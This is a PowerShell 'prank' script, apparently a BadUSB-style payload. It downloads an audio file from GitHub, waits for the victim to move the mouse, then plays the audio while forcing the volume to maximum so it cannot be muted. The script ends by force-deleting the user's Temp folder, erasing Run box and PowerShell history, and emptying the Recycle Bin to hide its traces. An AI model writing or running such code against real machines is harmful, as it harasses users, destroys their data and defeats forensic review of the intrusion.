#this is a much worse version of V1 in that the user cannot mute the audio file playing as it will be locked at 100 for the entire duration. to stop audio close the powershell window if you can find it in time (:
$wav = "https://github.com/MajorMarmalade/Sounds/blob/main/VeryBadPrank/ytmp3freecc-asmr-s-love-in-the-shower-youtubemp3freeorg_Ejxl9Sel.wav?raw=true"

$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav

Add-Type -AssemblyName PresentationCore
$mediaPlayer = New-Object System.Windows.Media.MediaPlayer
$mediaPlayer.Open([System.Uri]"file:///$env:TMP\s.wav")

Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position

while (1) {
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        break
    }
}

$mediaPlayer.Play()

function Raise-Volume {
    $k=[Math]::Ceiling(100/2)
    $o=New-Object -ComObject WScript.Shell
    for($i = 0;$i -lt $k;$i++) {
        $o.SendKeys([char] 175)
    }
}

while ($mediaPlayer.Position -lt $mediaPlayer.NaturalDuration.TimeSpan) {
    Raise-Volume
    Start-Sleep -Milliseconds 200
}

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
